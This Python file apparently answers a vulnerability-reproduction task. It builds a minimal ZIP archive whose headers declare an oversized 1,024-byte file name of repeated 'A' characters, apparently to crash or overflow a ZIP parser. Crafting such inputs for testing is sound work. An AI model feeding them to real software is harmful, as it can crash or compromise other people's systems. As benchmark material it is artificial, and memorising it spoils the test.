import struct
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        name_len = 1024
        name = b"A" * name_len

        sig_local = 0x04034B50
        sig_cdir = 0x02014B50
        sig_eocd = 0x06054B50

        version_needed = 20
        version_made_by = 20
        flag = 0
        method = 0
        mod_time = 0
        mod_date = 0
        crc32 = 0
        comp_size = 0
        uncomp_size = 0
        extra_len = 0
        comment_len = 0

        local_header = struct.pack(
            "<IHHHHHIIIHH",
            sig_local,
            version_needed,
            flag,
            method,
            mod_time,
            mod_date,
            crc32,
            comp_size,
            uncomp_size,
            name_len,
            extra_len,
        )

        local_offset = 0
        central_header = struct.pack(
            "<IHHHHHHIIIHHHHHII",
            sig_cdir,
            version_made_by,
            version_needed,
            flag,
            method,
            mod_time,
            mod_date,
            crc32,
            comp_size,
            uncomp_size,
            name_len,
            extra_len,
            comment_len,
            0,  # disk number start
            0,  # internal file attributes
            0,  # external file attributes
            local_offset,
        )

        cd_offset = len(local_header) + name_len
        cd_size = len(central_header) + name_len

        eocd = struct.pack(
            "<IHHHHIIH",
            sig_eocd,
            0,  # number of this disk
            0,  # disk where central directory starts
            1,  # number of central directory records on this disk
            1,  # total number of central directory records
            cd_size,
            cd_offset,
            0,  # zip file comment length
        )

        return local_header + name + central_header + name + eocd